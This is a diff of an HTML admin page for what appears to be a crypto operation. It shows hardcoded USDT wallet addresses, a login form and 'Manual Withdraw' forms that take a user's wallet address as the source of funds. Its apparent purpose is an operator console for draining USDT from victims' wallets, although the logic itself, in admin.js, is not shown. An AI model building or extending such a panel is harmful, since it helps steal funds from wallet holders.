@@ -1,33 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Admin Panel - Project A</title>
+  <meta charset="UTF-8">
+  <title>Admin Panel</title>
   <link rel="stylesheet" href="admin.css">
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/jquery@3.6.0/dist/jquery.min.js"></script>
 </head>
 <body>
-  <h1>Admin Panel - Project A</h1>
-
-  <div id="balances">
-    <h2>Live USDT Balances</h2>
-    <p>TRC-20 Wallet:<br><b>TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</b><br>Balance: <span id="trcBalance">Loading...</span></p>
-    <p>BEP-20 Wallet:<br><b>0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E</b><br>Balance: <span id="bepBalance">Loading...</span></p>
+  <div class="login-container" id="loginBox">
+    <h2>Admin Login</h2>
+    <input type="text" id="username" placeholder="Username" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="login()">Login</button>
   </div>
 
-  <div id="withdraw">
-    <h2>Manual Withdraw</h2>
-    <input type="text" id="fromAddress" placeholder="User wallet address">
-    <input type="number" id="amount" placeholder="Amount in USDT">
-    <button onclick="withdrawTRC20()">Withdraw TRC-20</button>
-    <button onclick="withdrawBEP20()">Withdraw BEP-20</button>
-    <p id="withdrawStatus"></p>
+  <div class="panel-container" id="panel" style="display:none;">
+    <h1>Admin Panel</h1>
+    <div class="section">
+      <h2>TRC-20 Wallet Logs</h2>
+      <ul id="trcLogs"></ul>
+    </div>
+
+    <div class="section">
+      <h2>BEP-20 Wallet Logs</h2>
+      <ul id="bepLogs"></ul>
+    </div>
+
+    <div class="section">
+      <h2>Manual Withdraw</h2>
+      <h3>TRC-20</h3>
+      <input type="text" id="trcFrom" placeholder="From Address">
+      <input type="text" id="trcAmount" placeholder="Amount in USDT">
+      <button onclick="manualWithdrawTRC()">Withdraw TRC-20</button>
+
+      <h3>BEP-20</h3>
+      <input type="text" id="bepFrom" placeholder="From Address">
+      <input type="text" id="bepAmount" placeholder="Amount in USDT">
+      <button onclick="manualWithdrawBEP()">Withdraw BEP-20</button>
+    </div>
   </div>
 
-  <div id="logs">
-    <h2>Interaction Logs</h2>
-    <ul id="logList"></ul>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
   <script src="admin.js"></script>
 </body>
 </html>
